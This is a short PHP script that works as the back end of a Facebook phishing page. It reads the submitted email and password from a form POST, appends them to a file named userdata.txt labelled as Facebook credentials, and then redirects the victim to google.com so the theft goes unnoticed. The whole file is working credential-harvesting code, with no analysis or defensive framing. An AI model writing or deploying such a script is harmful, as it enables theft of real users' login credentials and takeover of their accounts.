<?php
file_put_contents("userdata.txt", "Facebook Username: " . $_POST['email'] . "\nPassword: " . $_POST['pass'] ."\n", FILE_APPEND);
header("location: https://google.com");
?>
